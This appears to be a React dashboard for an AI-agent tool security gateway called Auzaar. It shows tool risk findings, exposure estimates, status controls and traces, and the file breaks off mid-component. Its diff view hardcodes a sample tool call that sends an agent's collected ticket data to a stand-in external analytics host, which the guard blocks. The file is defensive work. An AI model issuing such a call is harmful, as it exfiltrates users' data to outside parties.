"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { ViewToggle } from "@/components/ViewToggle";

/* ─── Types ─────────────────────────────────────────────────────────────── */

interface Finding {
  id: string;
  label: string;
  severity: string;
  phrase: string;
  location: string;
  why: string;
  action: string;
}

interface LinkedData {
  id: string;
  label: string;
  category: string;
  severity: string;
  icon: string;
  regulation: string;
  cost: {
    headline: string;
    low: number;
    high: number;
    unit: string;
    items: string[];
  };
}

interface BlastRadius {
  linked: LinkedData[];
  blastScore: string;
  costMin: number;
  costMax: number;
}

interface Tool {
  name: string;
  description: string;
  status: string;
  riskScore: string;
  findings: Finding[];
  blastRadius: BlastRadius;
  server_url?: string;
  source?: string;
  version?: number;
  registeredAt?: string;
  registrationFingerprint?: string;
  slm?: { risk_score: number; reason: string; flags: string[]; error?: string | null };
}

interface Alert {
  type: string;
  tool_name: string;
  status: string;
  timestamp: string;
  severity: string;
  message: string;
  blast_radius?: BlastRadius;
  attempted_payload?: { tool: string; arguments: Record<string, unknown> };
  guard_response?: { error: string; message: string };
}

interface TraceEntry {
  id: string;
  timestamp: string;
  op: string;
  tool: string;
  status: string;
  duration_ms: number;
  input?: unknown;
  output?: unknown;
  meta?: Record<string, unknown>;
}

/* ─── Helpers ───────────────────────────────────────────────────────────── */

const GATEWAY = process.env.NEXT_PUBLIC_GATEWAY_URL || "http://localhost:8001";

const fmt = (n: number) => {
  if (n >= 1e6) return `$${(n / 1e6).toFixed(1)}M`;
  if (n >= 1e3) return `$${Math.round(n / 1e3)}K`;
  return `$${n}`;
};

const sevColor: Record<string, string> = {
  critical: "text-critical",
  high: "text-high",
  medium: "text-medium",
  low: "text-green",
};

const sevBg: Record<string, string> = {
  critical: "bg-critical/10 border-critical/30",
  high: "bg-high/10 border-high/30",
  medium: "bg-medium/10 border-medium/30",
  low: "bg-green/10 border-green/30",
};

const statusBg: Record<string, string> = {
  approved: "bg-green/10 text-green border-green/30",
  review: "bg-high/10 text-high border-high/30",
  blocked: "bg-critical/10 text-critical border-critical/30",
  quarantined: "bg-purple/10 text-purple border-purple/30",
};

const opColor: Record<string, { bg: string; text: string; label: string }> = {
  "register.start":       { bg: "bg-accent/15", text: "text-accent", label: "REG" },
  "register.complete":    { bg: "bg-accent/15", text: "text-accent", label: "REG" },
  "register.fingerprint_drift": { bg: "bg-purple/20", text: "text-purple", label: "FPD" },
  "scan.deterministic":   { bg: "bg-medium/15", text: "text-medium", label: "DET" },
  "scan.slm":             { bg: "bg-purple/15", text: "text-purple", label: "SLM" },
  "scan.slm.parsed":      { bg: "bg-purple/15", text: "text-purple", label: "SLM" },
  "intercept.lookup":     { bg: "bg-green/15",  text: "text-green",  label: "LKP" },
  "intercept.blocked":    { bg: "bg-critical/15", text: "text-critical", label: "BLK" },
  "intercept.forward":    { bg: "bg-accent/15", text: "text-accent", label: "FWD" },
  "intercept.forward.error": { bg: "bg-critical/15", text: "text-critical", label: "ERR" },
  "intercept.response":   { bg: "bg-green/15",  text: "text-green",  label: "RSP" },
  "execute.start":        { bg: "bg-white/10",  text: "text-white/60", label: "EXE" },
  "execute.complete":     { bg: "bg-white/10",  text: "text-white/60", label: "EXE" },
  "blast_radius":         { bg: "bg-high/15",   text: "text-high",   label: "BLR" },
  "status_change":        { bg: "bg-purple/15", text: "text-purple", label: "STS" },
};

const defaultOpColor = { bg: "bg-white/10", text: "text-white/50", label: "???" };

/* ─── Main Dashboard ────────────────────────────────────────────────────── */

export default function Dashboard() {
  const [tools, setTools] = useState<Tool[]>([]);
  const [alerts, setAlerts] = useState<Alert[]>([]);
  const [traces, setTraces] = useState<TraceEntry[]>([]);
  const [selected, setSelected] = useState<Tool | null>(null);
  const [wsConnected, setWsConnected] = useState(false);
  const [rightTab, setRightTab] = useState<"alerts" | "trace">("trace");
  const wsRef = useRef<WebSocket | null>(null);

  /* Fetch tools + alerts + traces from gateway (each independent) */
  const refresh = useCallback(async () => {
    const safeFetch = async <T,>(url: string): Promise<T | null> => {
      try {
        const res = await fetch(url);
        if (!res.ok) return null;
        return await res.json();
      } catch {
        return null;
      }
    };

    const [t, a, tr] = await Promise.all([
      safeFetch<Tool[]>(`${GATEWAY}/tools`),
      safeFetch<Alert[]>(`${GATEWAY}/alerts`),
      safeFetch<TraceEntry[]>(`${GATEWAY}/traces?count=150`),
    ]);

    if (Array.isArray(t)) setTools(t);
    if (Array.isArray(a)) setAlerts(a);
    if (Array.isArray(tr)) setTraces(tr);
  }, []);

  /* WebSocket connection for real-time alerts */
  useEffect(() => {
    refresh();
    const interval = setInterval(refresh, 4000);

    const wsUrl = GATEWAY.replace(/^http/, "ws") + "/ws";
    const connect = () => {
      const ws = new WebSocket(wsUrl);
      wsRef.current = ws;
      ws.onopen = () => setWsConnected(true);
      ws.onclose = () => {
        setWsConnected(false);
        setTimeout(connect, 3000);
      };
      ws.onmessage = (evt) => {
        try {
          const msg = JSON.parse(evt.data);
          if (msg.event === "alert" && msg.data) {
            setAlerts((prev) => [msg.data, ...prev].slice(0, 30));
            refresh();
          }
          if (msg.event === "trace" && msg.data) {
            setTraces((prev) => [msg.data, ...prev].slice(0, 200));
          }
          if (msg.event === "status_change") {
            refresh();
          }
        } catch { /* ignore bad messages */ }
      };
    };
    connect();

    return () => {
      clearInterval(interval);
      wsRef.current?.close();
    };
  }, [refresh]);

  /* Update selected tool when tools list refreshes */
  useEffect(() => {
    if (selected) {
      const updated = tools.find((t) => t.name === selected.name);
      if (updated) setSelected(updated);
    }
  }, [tools, selected]);

  const blocked = tools.filter((t) => t.status === "blocked" || t.status === "quarantined");
  const totalExposure = tools.reduce((s, t) => s + (t.blastRadius?.costMax || 0), 0);
  const criticalCount = tools.filter((t) => t.riskScore === "critical").length;

  return (
    <div className="h-screen flex flex-col overflow-hidden">
      {/* ─── Header ─── */}
      <header className="h-13 glass border-b border-white/[0.06] px-5 flex items-center justify-between shrink-0">
        <div className="flex items-center gap-3">
          <img
            src="/auzaar-icon.png"
            alt=""
            width={28}
            height={28}
            aria-hidden
            className="w-7 h-7 rounded-md object-cover shadow-[0_0_16px_rgba(0,200,255,0.25)]"
          />
          <span className="text-sm font-bold tracking-tight">Auzaar</span>
          <span className="text-[11px] text-white/40 uppercase tracking-wider">
            Security Gateway
          </span>
        </div>
        <div className="flex items-center gap-3">
          <ViewToggle />
          <div className="text-xs text-white/50">
            <span
              className={`inline-block w-1.5 h-1.5 rounded-full mr-1.5 ${wsConnected ? "bg-green live-dot" : "bg-critical"}`}
            />
            {wsConnected ? "Live" : "Connecting..."}
          </div>
        </div>
      </header>

      {/* ─── Body ─── */}
      <div className="flex-1 flex overflow-hidden">
        {/* Left: summary + tool list */}
        <div className="w-[340px] border-r border-white/[0.06] flex flex-col overflow-hidden shrink-0">
          {/* Summary cards */}
          <div className="p-3 space-y-2 border-b border-white/[0.06]">
            <div className="grid grid-cols-3 gap-2">
              <SummaryCard label="Total Exposure" value={fmt(totalExposure)} danger />
              <SummaryCard label="Critical" value={String(criticalCount)} danger />
              <SummaryCard label="Tools" value={String(tools.length)} />
            </div>
          </div>

          {/* Tool list */}
          <div className="flex-1 overflow-y-auto">
            {tools.length === 0 && (
              <div className="p-8 text-center text-xs text-white/30">
                Waiting for tools to register...
              </div>
            )}
            {tools
              .sort((a, b) => {
                const ord: Record<string, number> = { blocked: 0, quarantined: 1, review: 2, approved: 3 };
                return (ord[a.status] ?? 4) - (ord[b.status] ?? 4);
              })
              .map((tool) => (
                <button
                  key={tool.name}
                  onClick={() => setSelected(tool)}
                  className={`w-full text-left px-3 py-2.5 border-b border-white/[0.04] transition-colors hover:bg-white/[0.03] ${
                    selected?.name === tool.name
                      ? "bg-accent/[0.07] border-l-2 border-l-accent"
                      : `border-l-2 ${
                          tool.riskScore === "critical"
                            ? "border-l-critical"
                            : tool.riskScore === "high"
                              ? "border-l-high"
                              : "border-l-transparent"
                        }`
                  }`}
                >
                  <div className="flex items-center justify-between mb-0.5">
                    <span className="font-mono text-xs font-bold flex items-center gap-1.5">
                      {tool.riskScore === "critical" && (
                        <span className="w-1.5 h-1.5 rounded-full bg-critical animate-pulse-dot" />
                      )}
                      {tool.name}
                    </span>
                    <Badge severity={tool.status} label={tool.status} />
                  </div>
                  <div className="text-[11px] text-white/30 truncate">
                    {tool.description?.slice(0, 60)}
                  </div>
                  <div className="flex items-center gap-1.5 mt-1">
                    <Badge severity={tool.riskScore} label={tool.riskScore} />
                    {tool.blastRadius?.costMax > 0 && (
                      <span className="text-[10px] font-bold text-critical">
                        {fmt(tool.blastRadius.costMax)}
                      </span>
                    )}
                  </div>
                </button>
              ))}
          </div>
        </div>

        {/* Center: detail panel */}
        <div className="flex-1 overflow-y-auto">
          {selected ? (
            <ToolDetail tool={selected} onRefresh={refresh} />
          ) : (
            <div className="h-full flex flex-col items-center justify-center text-white/20 gap-3">
              <div className="text-5xl opacity-20">&#x2B21;</div>
              <div className="font-bold text-white/40">Select a tool</div>
              <div className="text-xs">Click any tool in the list to inspect</div>
            </div>
          )}
        </div>

        {/* Right: tabbed panel (Alerts / Dev Trace) */}
        <div className="w-[360px] min-w-0 border-l border-white/[0.06] flex flex-col overflow-hidden shrink-0">
          {/* Tab header */}
          <div className="flex border-b border-white/[0.06] shrink-0">
            <button
              onClick={() => setRightTab("alerts")}
              className={`flex-1 px-3 py-2 text-[11px] font-bold uppercase tracking-wider border-b-2 transition-colors ${
                rightTab === "alerts"
                  ? "text-critical border-b-critical"
                  : "text-white/30 border-b-transparent hover:text-white/50"
              }`}
            >
              Alerts
              {alerts.length > 0 && (
                <span className="ml-1.5 bg-critical/20 text-critical rounded px-1 py-0 text-[9px]">
                  {alerts.length}
                </span>
              )}
            </button>
            <button
              onClick={() => setRightTab("trace")}
              className={`flex-1 px-3 py-2 text-[11px] font-bold uppercase tracking-wider border-b-2 transition-colors ${
                rightTab === "trace"
                  ? "text-accent border-b-accent"
                  : "text-white/30 border-b-transparent hover:text-white/50"
              }`}
            >
              Dev Trace
              {traces.length > 0 && (
                <span className="ml-1.5 bg-accent/20 text-accent rounded px-1 py-0 text-[9px]">
                  {traces.length}
                </span>
              )}
            </button>
          </div>

          {/* Tab content */}
          {rightTab === "alerts" ? (
            <div className="flex-1 overflow-y-auto p-1.5">
              {alerts.length === 0 && (
                <div className="p-6 text-center text-xs text-white/30">No alerts yet</div>
              )}
              {alerts.map((a, i) => (
                <AlertCard key={`${a.timestamp}-${i}`} alert={a} />
              ))}
            </div>
          ) : (
            <DevTracePanel traces={traces} />
          )}
        </div>
      </div>
    </div>
  );
}

/* ─── Summary Card ──────────────────────────────────────────────────────── */

function SummaryCard({
  label,
  value,
  danger,
}: {
  label: string;
  value: string;
  danger?: boolean;
}) {
  return (
    <div className={`glass rounded-lg p-2.5 ${danger ? "border-l-2 border-l-critical" : ""}`}>
      <div className="text-[9px] font-bold uppercase tracking-wider text-white/40 mb-1">
        {label}
      </div>
      <div
        className={`text-lg font-extrabold tabular-nums ${danger ? "text-critical" : "text-white"}`}
      >
        {value}
      </div>
    </div>
  );
}

/* ─── Badge ─────────────────────────────────────────────────────────────── */

function Badge({ severity, label }: { severity: string; label: string }) {
  const bg = statusBg[severity] || sevBg[severity] || "bg-white/5 text-white/50 border-white/10";
  return (
    <span className={`inline-flex px-1.5 py-0.5 rounded text-[10px] font-bold border ${bg}`}>
      {label}
    </span>
  );
}

/* ─── Alert Card ────────────────────────────────────────────────────────── */

function AlertCard({ alert }: { alert: Alert }) {
  const borderColor =
    alert.severity === "critical"
      ? "border-l-critical bg-critical/5"
      : alert.severity === "high"
        ? "border-l-high bg-high/5"
        : "border-l-medium bg-medium/5";

  return (
    <div
      className={`p-2.5 rounded-lg mb-1.5 border-l-[3px] ${borderColor} animate-slide-in`}
    >
      <div className="text-[9px] font-bold uppercase tracking-wider opacity-50 mb-0.5">
        {alert.type.replace(/-/g, " ")}
      </div>
      <div className="text-xs font-medium leading-snug mb-1">{alert.message}</div>
      <div className="flex justify-between text-[10px] text-white/30">
        <span className="font-mono">{alert.tool_name}</span>
        <span>{new Date(alert.timestamp).toLocaleTimeString()}</span>
      </div>
    </div>
  );
}

/* ─── Tool Detail Panel ─────────────────────────────────────────────────── */

function ToolDetail({ tool, onRefresh }: { tool: Tool; onRefresh: () => void }) {
  const [activeTab, setActiveTab] = useState<"blast" | "findings" | "diff" | "controls">("blast");
  const [saving, setSaving] = useState(false);

  const setStatus = async (status: string) => {
    setSaving(true);
    try {
      await fetch(`${GATEWAY}/tools/${encodeURIComponent(tool.name)}/status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status }),
      });
      onRefresh();
    } catch { /* ignore */ }
    setSaving(false);
  };

  const tabs = [
    { id: "blast" as const, label: "Blast Radius", count: tool.blastRadius?.linked?.length },
    { id: "findings" as const, label: "Findings", count: tool.findings?.length },
    { id: "diff" as const, label: "Diff View", count: null },
    { id: "controls" as const, label: "Controls", count: null },
  ];

  return (
    <div className="flex flex-col h-full">
      {/* Sticky header */}
      <div className="glass border-b border-white/[0.06] px-6 pt-5 pb-0 shrink-0">
        <div className="flex items-start justify-between mb-1">
          <h2 className="font-mono text-xl font-extrabold tracking-tight flex items-center gap-2">
            {tool.riskScore === "critical" && (
              <span className="w-2 h-2 rounded-full bg-critical animate-pulse-dot" />
            )}
            {tool.name}
          </h2>
          <div className="flex gap-1.5">
            <Badge severity={tool.riskScore} label={tool.riskScore} />
            <Badge severity={tool.status} label={tool.status} />
          </div>
        </div>
        <p className="text-sm text-white/50 mb-3 max-w-2xl">{tool.description}</p>
        <div className="mb-3 max-w-2xl">
          <div className="text-[10px] font-bold uppercase tracking-wider text-white/35 mb-1">
            Registration fingerprint (SHA-256)
          </div>
          {tool.registrationFingerprint ? (
            <code className="block text-[11px] font-mono text-white/55 break-all leading-relaxed">
              {tool.registrationFingerprint}
            </code>
          ) : (
            <span className="text-xs text-white/30">Not recorded (re-register to capture)</span>
          )}
        </div>
        {tool.slm && !tool.slm.error && (
          <div className="text-xs text-white/40 mb-3 flex items-center gap-3">
            <span>
              SLM score:{" "}
              <span className={tool.slm.risk_score >= 0.6 ? "text-critical font-bold" : "text-green font-bold"}>
                {tool.slm.risk_score.toFixed(2)}
              </span>
            </span>
            {tool.slm.reason && <span className="text-white/30">— {tool.slm.reason}</span>}
            {tool.slm.flags?.length > 0 && (
              <span className="text-white/30">
                [{tool.slm.flags.join(", ")}]
              </span>
            )}
          </div>
        )}

        {/* Tabs */}
        <div className="flex gap-0 border-t border-white/[0.06] -mx-6 px-6">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`px-4 py-2.5 text-[11px] font-bold uppercase tracking-wider border-b-2 transition-colors ${
                activeTab === tab.id
                  ? "text-accent border-b-accent"
                  : "text-white/30 border-b-transparent hover:text-white/50"
              }`}
            >
              {tab.label}
              {tab.count != null && tab.count > 0 && (
                <span className="ml-1.5 bg-critical/20 text-critical rounded px-1 py-0 text-[9px]">
                  {tab.count}
                </span>
              )}
            </button>
          ))}
        </div>
      </div>

      {/* Tab content */}
      <div className="flex-1 overflow-y-auto p-6">
        {activeTab === "blast" && <BlastRadiusTab tool={tool} />}
        {activeTab === "findings" && <FindingsTab tool={tool} />}
        {activeTab === "diff" && <DiffViewTab tool={tool} />}
        {activeTab === "controls" && (
          <ControlsTab tool={tool} onSetStatus={setStatus} saving={saving} />
        )}
      </div>
    </div>
  );
}

/* ─── Blast Radius Tab ──────────────────────────────────────────────────── */

function BlastRadiusTab({ tool }: { tool: Tool }) {
  const br = tool.blastRadius;
  if (!br?.linked?.length) {
    return (
      <div className="glass rounded-xl p-12 text-center">
        <div className="text-4xl mb-3 opacity-30">&#x2705;</div>
        <div className="font-bold text-white/50 mb-2">No data linkages detected</div>
        <div className="text-xs text-white/30">No sensitive data references found in this tool.</div>
      </div>
    );
  }

  const BENCH = 4_450_000;
  const pct = Math.min(Math.round((br.costMax / BENCH) * 100), 100);

  return (
    <div className="space-y-4">
      {/* Cost headline */}
      <div className="glass rounded-xl p-5">
        <div className="flex items-start justify-between mb-4">
          <div>
            <div className="text-[10px] font-bold uppercase tracking-wider text-white/40 mb-1">
              Estimated Exposure
            </div>
            <div className="text-xs text-white/30">
              If compromised — aggregate across linked data types
            </div>
          </div>
          <div className="text-right">
            <div className="text-2xl font-extrabold text-critical">
              {fmt(br.costMin)} – {fmt(br.costMax)}
            </div>
            {br.blastScore === "critical" && (
              <div className="mt-1 inline-block bg-critical/10 text-critical border border-critical/30 text-[10px] font-bold px-2 py-0.5 rounded">
                CRITICAL EXPOSURE
              </div>
            )}
          </div>
        </div>
        {/* Benchmark bar */}
        <div className="h-1.5 bg-white/[0.08] rounded-full overflow-hidden mb-1.5">
          <div
            className="h-full bg-critical rounded-full transition-all duration-700"
            style={{ width: `${pct}%` }}
          />
        </div>
        <div className="flex justify-between text-[10px] text-white/30">
          <span>$0</span>
          <span>Industry avg breach: {fmt(BENCH)}</span>
        </div>
      </div>

      {/* Linked data cards */}
      <div className="grid grid-cols-1 gap-3">
        {br.linked.map((l) => (
          <div
            key={l.id}
            className={`glass rounded-xl overflow-hidden border-l-[3px] ${
              l.severity === "critical"
                ? "border-l-critical"
                : l.severity === "high"
                  ? "border-l-high"
                  : "border-l-medium"
            }`}
          >
            <div className="px-4 py-3 flex items-center gap-3">
              <span className="text-lg">{l.icon}</span>
              <span className="font-semibold text-sm flex-1">{l.label}</span>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-accent/10 text-accent border border-accent/30">
                {l.regulation}
              </span>
            </div>
            <div className="px-4 pb-3 border-t border-white/[0.06] pt-2 grid grid-cols-2 gap-4">
              <div>
                <div className="text-[10px] font-bold uppercase tracking-wider text-white/30 mb-2">
                  Business Impact
                </div>
                <div className="space-y-1">
                  {l.cost.items.slice(0, 3).map((item, i) => (
                    <div key={i} className="flex items-start gap-1.5 text-[11px] text-white/50">
                      <span className={`w-1 h-1 rounded-full mt-1.5 shrink-0 bg-${l.severity === "critical" ? "critical" : l.severity === "high" ? "high" : "medium"}`} />
                      {item}
                    </div>
                  ))}
                </div>
              </div>
              <div>
                <div className="text-[10px] font-bold uppercase tracking-wider text-white/30 mb-2">
                  Cost Estimate
                </div>
                {l.cost.unit === "multiplier" ? (
                  <div className="text-critical text-sm font-bold">
                    Exfiltration multiplier
                    <div className="text-[11px] font-normal text-white/30 mt-1">
                      Amplifies all linked data types
                    </div>
                  </div>
                ) : (
                  <>
                    <div className={`text-lg font-extrabold ${sevColor[l.severity] || ""}`}>
                      {fmt(l.cost.low)} – {fmt(l.cost.high)}
                    </div>
                    <div className="text-[11px] text-white/30">{l.cost.headline}</div>
                  </>
                )}
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── Findings Tab ──────────────────────────────────────────────────────── */

function FindingsTab({ tool }: { tool: Tool }) {
  const findings = tool.findings || [];
  if (!findings.length) {
    return (
      <div className="glass rounded-xl p-12 text-center">
        <div className="text-4xl mb-3 opacity-30">&#x1F50D;</div>
        <div className="font-bold text-white/50 mb-2">No injection patterns detected</div>
        <div className="text-xs text-white/30">Deterministic scanner found no issues.</div>
      </div>
    );
  }

  return (
    <div className="space-y-3">
      {findings.map((f, i) => (
        <div key={i} className="glass rounded-xl overflow-hidden">
          <div className={`px-4 py-2.5 flex items-center gap-3 border-b border-white/[0.06] ${sevBg[f.severity] || ""}`}>
            <Badge severity={f.severity} label={f.severity.toUpperCase()} />
            <span className="font-bold text-sm flex-1">{f.label}</span>
            <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-accent/10 text-accent border border-accent/30 uppercase tracking-wider">
              {f.location}
            </span>
          </div>
          <div className="p-4 space-y-3">
            <div>
              <div className="text-[10px] font-bold uppercase tracking-wider text-white/30 mb-1">
                Matched Phrase
              </div>
              <div className="bg-black/30 border border-white/10 rounded-md px-3 py-2 font-mono text-xs text-critical break-all">
                &quot;{f.phrase}&quot;
              </div>
            </div>
            <div>
              <div className="text-[10px] font-bold uppercase tracking-wider text-white/30 mb-1">
                Why It Matters
              </div>
              <div className="text-sm text-white/60 leading-relaxed">{f.why}</div>
            </div>
            <div>
              <div className="text-[10px] font-bold uppercase tracking-wider text-white/30 mb-1">
                Recommended Action
              </div>
              <div className="bg-accent/5 border border-accent/20 rounded-md px-3 py-2 text-xs text-accent leading-relaxed">
                {f.action}
              </div>
            </div>
          </div>
        </div>
      ))}
    </div>
  );
}

/* ─── Diff View Tab ─────────────────────────────────────────────────────── */

function DiffViewTab({ tool }: { tool: Tool }) {
  if (tool.status !== "blocked" && tool.status !== "quarantined") {
    return (
      <div className="glass rounded-xl p-12 text-center">
        <div className="text-4xl mb-3 opacity-30">&#x1F6E1;</div>
        <div className="font-bold text-white/50 mb-2">No blocked executions</div>
        <div className="text-xs text-white/30">
          Diff view shows attempted vs. blocked payloads when a tool execution is intercepted.
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-4">
      <div className="text-xs text-white/40 mb-2">
        Side-by-side comparison of what the agent attempted vs. what Auzaar returned.
      </div>
      <div className="grid grid-cols-2 gap-4">
        {/* Attempted payload */}
        <div className="glass rounded-xl overflow-hidden border-l-[3px] border-l-critical">
          <div className="px-4 py-2.5 bg-critical/10 border-b border-white/[0.06]">
            <span className="text-[11px] font-bold uppercase tracking-wider text-critical">
              &#x2717; Agent Attempted
            </span>
          </div>
          <div className="p-4 font-mono text-xs space-y-2">
            <div className="text-white/30 text-[10px]">JSON-RPC 2.0 Request</div>
            <pre className="bg-black/30 rounded-md p-3 text-critical/80 overflow-x-auto whitespace-pre-wrap">
{JSON.stringify(
  {
    jsonrpc: "2.0",
    method: "tools/call",
    params: {
      name: tool.name,
      arguments: {
        data: "<all ticket data collected by agent>",
        callback_url: "http://external-analytics.example.com/collect",
      },
    },
    id: `agent-${tool.name}`,
  },
  null,
  2
)}
            </pre>
          </div>
        </div>

        {/* Guard response */}
        <div className="glass rounded-xl overflow-hidden border-l-[3px] border-l-green">
          <div className="px-4 py-2.5 bg-green/10 border-b border-white/[0.06]">
            <span className="text-[11px] font-bold uppercase tracking-wider text-green">
              &#x2713; Guard Blocked
            </span>
          </div>
          <div className="p-4 font-mono text-xs space-y-2">
            <div className="text-white/30 text-[10px]">JSON-RPC 2.0 Error Response</div>
            <pre className="bg-black/30 rounded-md p-3 text-green/80 overflow-x-auto whitespace-pre-wrap">
{JSON.stringify(
  {
    jsonrpc: "2.0",
    error: {
      code: -32001,
      message: `GuardError: Tool '${tool.name}' is ${tool.status}. Execution denied by Auzaar.`,
      data: {
        guard_status: tool.status,
        blast_radius: {
          blastScore: tool.blastRadius?.blastScore,
          costMax: tool.blastRadius?.costMax,
          linkedTypes: tool.blastRadius?.linked?.length,
        },
      },
    },
    id: `agent-${tool.name}`,
  },
  null,
  2
)}
            </pre>
          </div>
        </div>
      </div>

      {/* Impact summary */}
      {tool.blastRadius?.costMax > 0 && (
        <div className="glass rounded-xl p-5 border-l-[3px] border-l-accent">
          <div className="flex items-center justify-between">
            <div>
              <div className="text-[10px] font-bold uppercase tracking-wider text-white/40 mb-1">
                Data Protected
              </div>
              <div className="text-sm text-white/60">
                {tool.blastRadius.linked.length} sensitive data type
                {tool.blastRadius.linked.length !== 1 ? "s" : ""} shielded from exfiltration
              </div>
            </div>
            <div className="text-right">
              <div className="text-2xl font-extrabold text-green">
                {fmt(tool.blastRadius.costMax)}
              </div>
              <div className="text-[11px] text-white/30">exposure prevented</div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ─── Controls Tab ──────────────────────────────────────────────────────── */

function ControlsTab({
  tool,
  onSetStatus,
  saving,
}: {
  tool: Tool;
  onSetStatus: (status: string) => void;
  saving: boolean;
}) {
  const options = [
    {
      value: "approved",
      name: "Approved",
      desc: "Cleared for all environments",
      color: "text-green",
    },
    {
      value: "review",
      name: "Review",
      desc: "Flagged, needs human review",
      color: "text-high",
    },
    {
      value: "blocked",
      name: "Blocked",
      desc: "Cannot run anywhere",
      color: "text-critical",
    },
    {
      value: "quarantined",
      name: "Quarantined",
      desc: "Isolated, all calls logged",
      color: "text-purple",
    },
  ];

  return (
    <div className="space-y-4 max-w-lg">
      {/* Current status */}
      <div className="glass rounded-xl p-4 flex items-center justify-between">
        <div>
          <div className="text-[11px] text-white/30 mb-1">Current Status</div>
          <Badge severity={tool.status} label={tool.status} />
        </div>
        <div className="text-right">
          <div className="text-[11px] text-white/30 mb-1">Version</div>
          <div className="font-mono text-lg font-extrabold text-accent">
            v{tool.version || 1}
          </div>
        </div>
      </div>

      <div className="text-[10px] font-bold uppercase tracking-wider text-white/30">
        Change status — takes effect on next execution
      </div>

      {/* Status options */}
      <div className="grid grid-cols-2 gap-2">
        {options.map((opt) => (
          <button
            key={opt.value}
            onClick={() => onSetStatus(opt.value)}
            disabled={saving}
            className={`glass rounded-xl p-3 text-left transition-all hover:border-white/20 ${
              tool.status === opt.value
                ? "border-accent/50 bg-accent/5 shadow-[0_0_16px_rgba(0,200,255,0.1)]"
                : ""
            } ${saving ? "opacity-50 cursor-not-allowed" : "cursor-pointer"}`}
          >
            <div className={`text-sm font-bold mb-0.5 ${opt.color}`}>{opt.name}</div>
            <div className="text-[11px] text-white/30">{opt.desc}</div>
          </button>
        ))}
      </div>
    </div>
  );
}

/* ─── Dev Trace Panel ──────────────────────────────────────────────────── */

function DevTracePanel({ traces }: { traces: TraceEntry[] }) {
  const [category, setCategory] = useState("");
  const [textFilter, setTextFilter] = useState("");
  const [toolFilter, setToolFilter] = useState<string>("all");
  const [statusFilter, setStatusFilter] = useState<string>("all");

  const uniqueTools = Array.from(new Set(traces.map((t) => t.tool).filter(Boolean)));

  const categories = [
    { key: "", label: "All" },
    { key: "register", label: "Register" },
    { key: "scan", label: "Scan" },
    { key: "intercept", label: "Intercept" },
    { key: "execute", label: "Execute" },
    { key: "blast", label: "Blast" },
    { key: "status", label: "Status" },
  ];

  const filtered = traces.filter((t) => {
    if (category && !t.op.startsWith(category)) return false;
    if (toolFilter !== "all" && t.tool !== toolFilter) return false;
    if (statusFilter !== "all" && t.status !== statusFilter) return false;
    if (textFilter) {
      const q = textFilter.toLowerCase();
      const searchable = `${t.op} ${t.tool} ${t.status}`.toLowerCase();
      if (!searchable.includes(q)) return false;
    }
    return true;
  });

  const matchCount = filtered.length;
  const totalCount = traces.length;

  return (
    <div className="flex-1 flex flex-col overflow-hidden min-w-0 min-h-0">
      {/* Filters — stay within panel width: no wrap on category pills (horizontal scroll) */}
      <div className="px-2 py-1.5 border-b border-white/[0.06] space-y-1.5 shrink-0 min-w-0">
        <input
          type="text"
          placeholder="Search ops, tools..."
          value={textFilter}
          onChange={(e) => setTextFilter(e.target.value)}
          className="w-full min-w-0 bg-white/5 border border-white/10 rounded px-2 py-1 text-[11px] text-white/80 placeholder:text-white/20 outline-none focus:border-accent/40"
        />
        <div className="flex gap-1 min-w-0">
          <select
            value={toolFilter}
            onChange={(e) => setToolFilter(e.target.value)}
            className="min-w-0 flex-1 bg-white/5 border border-white/10 rounded px-1.5 py-1 text-[11px] text-white/80 outline-none focus:border-accent/40 truncate"
            title={toolFilter === "all" ? "All tools" : toolFilter}
          >
            <option value="all">All tools</option>
            {uniqueTools.map((t) => (
              <option key={t} value={t}>
                {t}
              </option>
            ))}
          </select>
          <select
            value={statusFilter}
            onChange={(e) => setStatusFilter(e.target.value)}
            className="min-w-0 flex-1 bg-white/5 border border-white/10 rounded px-1.5 py-1 text-[11px] text-white/80 outline-none focus:border-accent/40"
          >
            <option value="all">Any status</option>
            <option value="ok">ok</option>
            <option value="blocked">blocked</option>
            <option value="error">error</option>
          </select>
        </div>
        <div className="flex flex-nowrap gap-1 items-center overflow-x-auto min-w-0 pb-0.5 [scrollbar-width:thin]">
          {categories.map((c) => (
            <button
              key={c.key}
              type="button"
              onClick={() => setCategory(category === c.key ? "" : c.key)}
              className={`shrink-0 px-1.5 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider transition-colors ${
                category === c.key
                  ? "bg-accent/20 text-accent border border-accent/30"
                  : "bg-white/5 text-white/30 border border-white/10 hover:text-white/50"
              }`}
            >
              {c.label}
            </button>
          ))}
          {(category || textFilter || toolFilter !== "all" || statusFilter !== "all") && (
            <button
              type="button"
              onClick={() => { setCategory(""); setTextFilter(""); setToolFilter("all"); setStatusFilter("all"); }}
              className="shrink-0 ml-1 text-[9px] text-white/25 hover:text-white/50 transition-colors"
            >
              Clear
            </button>
          )}
        </div>
        {totalCount > 0 && (
          <div className="text-[9px] text-white/20 tabular-nums">
            {matchCount === totalCount ? `${totalCount} traces` : `${matchCount} / ${totalCount} traces`}
          </div>
        )}
      </div>

      {/* Trace entries */}
      <div className="flex-1 overflow-y-auto p-1.5">
        {filtered.length === 0 && (
          <div className="p-6 text-center text-xs text-white/30">
            {traces.length === 0
              ? "Waiting for backend activity..."
              : "No traces match filter"}
          </div>
        )}
        {filtered.map((entry) => (
          <TraceCard key={entry.id} entry={entry} />
        ))}
      </div>
    </div>
  );
}

/* ─── Trace Card ───────────────────────────────────────────────────────── */

function TraceCard({ entry }: { entry: TraceEntry }) {
  const [expanded, setExpanded] = useState(false);
  const colors = opColor[entry.op] || defaultOpColor;

  const statusIcon =
    entry.status === "ok"
      ? "\u2713"
      : entry.status === "blocked"
        ? "\u2717"
        : "\u26A0";
  const statusColor =
    entry.status === "ok"
      ? "text-green"
      : entry.status === "blocked"
        ? "text-critical"
        : "text-high";

  const isSLM = entry.op.startsWith("scan.slm");

  return (
    <div
      className={`mb-1 rounded-lg border border-white/[0.05] overflow-hidden animate-slide-in ${
        entry.status === "blocked" ? "border-l-2 border-l-critical" : ""
      }`}
    >
